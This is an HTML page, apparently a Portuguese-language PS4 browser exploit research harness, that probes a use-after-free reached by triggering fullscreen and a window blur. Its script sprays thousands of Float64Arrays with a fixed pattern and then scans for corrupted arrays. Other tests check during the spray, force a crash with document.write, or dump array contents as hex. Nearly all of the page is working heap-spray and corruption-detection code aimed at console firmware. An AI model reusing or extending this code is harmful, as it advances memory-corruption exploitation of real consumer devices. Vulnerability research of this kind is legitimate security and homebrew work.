<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - AnÃ¡lise Forense</title>
<style>
body { 
    font-family: 'Courier New', monospace; 
    padding: 20px; 
    background: #0a0a0a; 
    color: #00ff00; 
}
button { 
    padding: 15px 25px; 
    margin: 10px 5px; 
    font-size: 16px; 
    font-family: inherit;
    cursor: pointer; 
    border: 2px solid #00ff00;
    background: #1a1a1a;
    color: #00ff00;
}
button:hover { background: #2a2a2a; }
.critical { color: #ff0000; font-weight: bold; }
.success { color: #00ff00; }
.warning { color: #ffaa00; }
.info { color: #00aaff; }
.debug { color: #888888; }
#log { 
    border: 2px solid #333; 
    padding: 15px; 
    margin-top: 20px; 
    max-height: 700px; 
    overflow-y: auto;
    background: #050505;
}
.section { 
    border-left: 3px solid #00ff00; 
    padding-left: 10px; 
    margin: 10px 0;
}
</style>
</head>
<body>
    <h1>ğŸ”¬ PS4 UAF - AnÃ¡lise Forense Profunda</h1>
    <h2>Investigando: Por que o UAF crasha mas nÃ£o Ã© detectÃ¡vel?</h2>
    
    <div style="background: #1a0000; border: 2px solid #ff0000; padding: 15px; margin: 20px 0;">
        <h3 class="critical">âš ï¸ HIPÃ“TESES PRINCIPAIS âš ï¸</h3>
        <p class="warning">1. CorrupÃ§Ã£o existe mas estÃ¡ em OFFSET diferente do [0]</p>
        <p class="warning">2. CorrupÃ§Ã£o Ã© PARCIAL (alguns bytes, nÃ£o todos os 8)</p>
        <p class="warning">3. GC invalida referÃªncias antes da verificaÃ§Ã£o</p>
        <p class="warning">4. Spray acerta mas Ã© sobrescrito antes de ler</p>
    </div>
    
    <h3>Testes DisponÃ­veis:</h3>
    
    <button onclick="forensicScan()">
        ğŸ” TESTE 1: Varredura Completa (todos offsets)
    </button>
    
    <button onclick="partialCorruption()">
        ğŸ§© TESTE 2: DetecÃ§Ã£o de CorrupÃ§Ã£o Parcial
    </button>
    
    <button onclick="immediateVerification()">
        âš¡ TESTE 3: VerificaÃ§Ã£o INSTANTÃ‚NEA (0ms)
    </button>
    
    <button onclick="crashOnly()">
        ğŸ’¥ TESTE 4: Apenas Crash (sem verificaÃ§Ã£o)
    </button>
    
    <button onclick="memoryDump()">
        ğŸ“Š TESTE 5: Memory Dump Completo
    </button>
    
    <button onclick="clearLog()" style="border-color: #666; color: #666;">
        ğŸ—‘ï¸ LIMPAR
    </button>
    
    <div id="log"></div>
    
    <script>
        let globalControllers = null;
        let globalSpray = null;
        
        function log(msg, cls) {
            const div = document.getElementById('log');
            const time = new Date().toLocaleTimeString() + '.' + String(Date.now()).slice(-3);
            div.innerHTML += `<div class="${cls || 'info'}">[${time}] ${msg}</div>`;
            div.scrollTop = div.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const PATTERN = h2f("0x4141414141414141");
        const MARKER1 = h2f("0xDEADBEEFCAFEBABE");
        const MARKER2 = h2f("0x1337133713371337");
        
        // TESTE 1: Varredura Completa de TODOS os offsets
        function forensicScan() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('ğŸ” TESTE 1: VARREDURA FORENSE COMPLETA', 'success');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('');
            log('Objetivo: Verificar TODOS os 8 offsets de TODOS os arrays', 'info');
            log('Teoria: CorrupÃ§Ã£o pode estar em offset diferente de [0]', 'warning');
            log('');
            
            globalControllers = [];
            
            log('[INIT] Criando 5000 controllers...', 'info');
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                // Preenche com valores Ãºnicos identificÃ¡veis
                for(let j = 0; j < 8; j++) {
                    arr[j] = i + (j * 0.1);
                }
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'success');
            log('[INIT] Cada controller[i][j] = i + (j * 0.1)', 'debug');
            log('[INIT] Exemplo: controller[100][0]=100.0, [1]=100.1, [2]=100.2...', 'debug');
            log('');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'critical');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('[BLUR] ğŸ¯ Detectado!', 'success');
                log('[SPRAY] Criando 8000 arrays...', 'info');
                
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] âœ… Spray completo', 'success');
                log('', 'info');
                log('[SCAN] Iniciando varredura forense...', 'info');
                log('[SCAN] Verificando 5000 arrays Ã— 8 offsets = 40,000 valores', 'warning');
                log('', 'info');
                
                let corrupted = [];
                let totalChecks = 0;
                
                for(let i = 0; i < globalControllers.length; i++) {
                    for(let j = 0; j < 8; j++) {
                        totalChecks++;
                        const expected = i + (j * 0.1);
                        const actual = globalControllers[i][j];
                        
                        // Verifica se Ã© PATTERN ou qualquer valor inesperado
                        if(actual === PATTERN) {
                            corrupted.push({
                                arrayIdx: i,
                                offset: j,
                                expected: expected,
                                actual: f2h(actual),
                                type: 'PATTERN_MATCH'
                            });
                        } else if(Math.abs(actual - expected) > 0.001) {
                            corrupted.push({
                                arrayIdx: i,
                                offset: j,
                                expected: expected,
                                actual: f2h(actual),
                                type: 'UNEXPECTED_VALUE'
                            });
                        }
                    }
                }
                
                log(`[SCAN] âœ… Varredura completa: ${totalChecks} valores verificados`, 'success');
                log('', 'info');
                
                if(corrupted.length > 0) {
                    log(`[RESULT] ğŸ‰ ${corrupted.length} CORRUPÃ‡Ã•ES DETECTADAS!`, 'critical');
                    log('', 'info');
                    
                    // Mostra primeiras 20
                    const show = Math.min(20, corrupted.length);
                    log(`[DETAILS] Mostrando primeiras ${show} corrupÃ§Ãµes:`, 'warning');
                    
                    for(let i = 0; i < show; i++) {
                        const c = corrupted[i];
                        log(`  [${i+1}] controller[${c.arrayIdx}][${c.offset}]`, 'info');
                        log(`      Esperado: ${c.expected}`, 'debug');
                        log(`      Obtido: ${c.actual}`, 'debug');
                        log(`      Tipo: ${c.type}`, c.type === 'PATTERN_MATCH' ? 'critical' : 'warning');
                    }
                    
                    if(corrupted.length > 20) {
                        log(`  ... e mais ${corrupted.length - 20} corrupÃ§Ãµes`, 'warning');
                    }
                } else {
                    log('[RESULT] âŒ NENHUMA CORRUPÃ‡ÃƒO DETECTADA', 'critical');
                    log('', 'info');
                    log('[DEBUG] Amostra dos primeiros 10 arrays:', 'debug');
                    for(let i = 0; i < 10; i++) {
                        let vals = [];
                        for(let j = 0; j < 8; j++) {
                            vals.push(globalControllers[i][j].toFixed(1));
                        }
                        log(`  controller[${i}] = [${vals.join(', ')}]`, 'debug');
                    }
                }
            };
        }
        
        // TESTE 2: DetecÃ§Ã£o de CorrupÃ§Ã£o Parcial (byte por byte)
        function partialCorruption() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('ğŸ§© TESTE 2: DETECÃ‡ÃƒO DE CORRUPÃ‡ÃƒO PARCIAL', 'success');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('');
            log('Objetivo: Detectar corrupÃ§Ã£o parcial (alguns bytes, nÃ£o todos)', 'info');
            log('Teoria: Spray pode sobrescrever apenas parte do Float64', 'warning');
            log('');
            
            globalControllers = [];
            
            log('[INIT] Criando 5000 controllers...', 'info');
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'success');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'critical');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('[BLUR] ğŸ¯ Detectado!', 'success');
                log('[SPRAY] Criando spray...', 'info');
                
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] âœ… Completo', 'success');
                log('', 'info');
                log('[SCAN] AnÃ¡lise byte-a-byte...', 'info');
                
                let partialCorruptions = [];
                
                for(let i = 0; i < globalControllers.length; i++) {
                    const val = globalControllers[i][0];
                    const hex = f2h(val);
                    const expected = f2h(i);
                    
                    // Compara byte por byte
                    let diffBytes = 0;
                    for(let b = 0; b < hex.length; b++) {
                        if(hex[b] !== expected[b]) diffBytes++;
                    }
                    
                    if(diffBytes > 0 && diffBytes < hex.length) {
                        partialCorruptions.push({
                            idx: i,
                            diffBytes: diffBytes,
                            expected: expected,
                            actual: hex
                        });
                    } else if(val === PATTERN) {
                        log(`[FULL] controller[${i}] TOTALMENTE corrompido`, 'critical');
                    }
                }
                
                if(partialCorruptions.length > 0) {
                    log(`[RESULT] ğŸ¯ ${partialCorruptions.length} corrupÃ§Ãµes PARCIAIS!`, 'warning');
                    
                    for(let i = 0; i < Math.min(10, partialCorruptions.length); i++) {
                        const p = partialCorruptions[i];
                        log(`  [${i+1}] controller[${p.idx}]`, 'info');
                        log(`      Esperado: ${p.expected}`, 'debug');
                        log(`      Obtido:   ${p.actual}`, 'debug');
                        log(`      Diff:     ${p.diffBytes} bytes diferentes`, 'warning');
                    }
                } else {
                    log('[RESULT] âŒ Sem corrupÃ§Ãµes parciais detectadas', 'critical');
                }
            };
        }
        
        // TESTE 3: VerificaÃ§Ã£o INSTANTÃ‚NEA (sem delay)
        function immediateVerification() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('âš¡ TESTE 3: VERIFICAÃ‡ÃƒO INSTANTÃ‚NEA', 'success');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('');
            log('Objetivo: Verificar corrupÃ§Ã£o DURANTE o spray (nÃ£o depois)', 'info');
            log('Teoria: CorrupÃ§Ã£o existe mas GC a desfaz antes da verificaÃ§Ã£o', 'warning');
            log('');
            
            globalControllers = [];
            
            log('[INIT] Criando 5000 controllers...', 'info');
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'success');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'critical');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('[BLUR] ğŸ¯ Detectado!', 'success');
                log('[SPRAY] Iniciando spray ENTRELAÃ‡ADO com verificaÃ§Ã£o...', 'info');
                
                globalSpray = [];
                let foundDuringSpray = false;
                
                // Spray em batches, verificando entre cada batch
                for(let batch = 0; batch < 80; batch++) {
                    // Cria 100 arrays
                    for(let i = 0; i < 100; i++) {
                        const s = new Float64Array(8);
                        s.fill(PATTERN);
                        globalSpray.push(s);
                    }
                    
                    // Verifica IMEDIATAMENTE
                    for(let i = 0; i < globalControllers.length; i++) {
                        if(globalControllers[i][0] === PATTERN) {
                            log(`[INSTANT] ğŸ‰ DETECTADO durante spray! Batch ${batch}, controller[${i}]`, 'critical');
                            foundDuringSpray = true;
                            
                            // Para o spray
                            batch = 999;
                            break;
                        }
                    }
                }
                
                log('[SPRAY] âœ… Completo', 'success');
                log('', 'info');
                
                if(foundDuringSpray) {
                    log('[RESULT] âœ… CorrupÃ§Ã£o detectada DURANTE spray!', 'success');
                    log('[CONCLUSION] O UAF Ã© INSTANTÃ‚NEO - GC nÃ£o Ã© o problema', 'success');
                } else {
                    log('[RESULT] âŒ NÃ£o detectado nem durante spray', 'critical');
                    log('[CONCLUSION] Problema pode ser:', 'warning');
                    log('  1. Spray nÃ£o atinge regiÃ£o correta', 'warning');
                    log('  2. Tamanho do Float64Array Ã© diferente do esperado', 'warning');
                    log('  3. Heap layout mudou no FW 12.00', 'warning');
                }
            };
        }
        
        // TESTE 4: Apenas Crash (baseline)
        function crashOnly() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
            log('ğŸ’¥ TESTE 4: CRASH CONTROLADO (BASELINE)', 'critical');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
            log('');
            log('âš ï¸ Este teste VAI crashar o navegador', 'critical');
            log('Objetivo: Confirmar que UAF bÃ¡sico ainda funciona', 'info');
            log('');
            
            globalControllers = [];
            
            log('[INIT] Criando 5000 controllers...', 'info');
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'success');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'critical');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('[BLUR] ğŸ¯ Detectado!', 'success');
                log('[SPRAY] Executando...', 'info');
                
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] âœ… Completo', 'success');
                log('', 'info');
                log('[CRASH] ğŸ’¥ğŸ’¥ğŸ’¥ CRASH EM 3 SEGUNDOS ğŸ’¥ğŸ’¥ğŸ’¥', 'critical');
                
                setTimeout(function() {
                    log('[CRASH] Executando document.write()...', 'critical');
                    document.open();
                    document.write('<html><body><h1>UAF Crash Test</h1></body></html>');
                    document.close();
                    setTimeout(() => location.reload(), 500);
                }, 3000);
            };
        }
        
        // TESTE 5: Memory Dump Completo
        function memoryDump() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('ğŸ“Š TESTE 5: MEMORY DUMP COMPLETO', 'success');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
            log('');
            log('Objetivo: Exportar estado COMPLETO da memÃ³ria para anÃ¡lise', 'info');
            log('');
            
            globalControllers = [];
            
            log('[INIT] Criando 1000 controllers (reduzido para dump)...', 'info');
            for(let i = 0; i < 1000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'success');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'critical');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('[BLUR] ğŸ¯ Detectado!', 'success');
                log('[SPRAY] Executando...', 'info');
                
                globalSpray = [];
                for(let i = 0; i < 3000; i++) {
                    const s = new Float64Array(8);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] âœ… Completo', 'success');
                log('', 'info');
                log('[DUMP] Exportando memÃ³ria...', 'info');
                
                const dump = {
                    timestamp: Date.now(),
                    controllers: [],
                    spray_sample: []
                };
                
                // Dump controllers
                for(let i = 0; i < globalControllers.length; i++) {
                    const arr = [];
                    for(let j = 0; j < 8; j++) {
                        arr.push(f2h(globalControllers[i][j]));
                    }
                    dump.controllers.push(arr);
                }
                
                // Dump amostra do spray
                for(let i = 0; i < 10; i++) {
                    const arr = [];
                    for(let j = 0; j < 8; j++) {
                        arr.push(f2h(globalSpray[i][j]));
                    }
                    dump.spray_sample.push(arr);
                }
                
                log('[DUMP] âœ… ExportaÃ§Ã£o completa', 'success');
                log('', 'info');
                
                // Disponibiliza globalmente
                window.memoryDump = dump;
                
                log('[EXPORT] Dump disponÃ­vel em: window.memoryDump', 'success');
                log('[EXPORT] Use console.log(JSON.stringify(window.memoryDump)) para copiar', 'info');
                log('', 'info');
                
                // AnÃ¡lise rÃ¡pida
                log('[ANALYSIS] AnÃ¡lise rÃ¡pida:', 'info');
                let uniqueValues = new Set();
                for(let ctrl of dump.controllers) {
                    uniqueValues.add(ctrl[0]);
                }
                log(`  Valores Ãºnicos em [0]: ${uniqueValues.size}`, 'debug');
                log(`  Esperado: ${dump.controllers.length}`, 'debug');
                log(`  Pattern (${f2h(PATTERN)}) presente: ${uniqueValues.has(f2h(PATTERN)) ? 'SIM' : 'NÃƒO'}`, 
                    uniqueValues.has(f2h(PATTERN)) ? 'critical' : 'warning');
            };
        }
    </script>
</body>
</html>
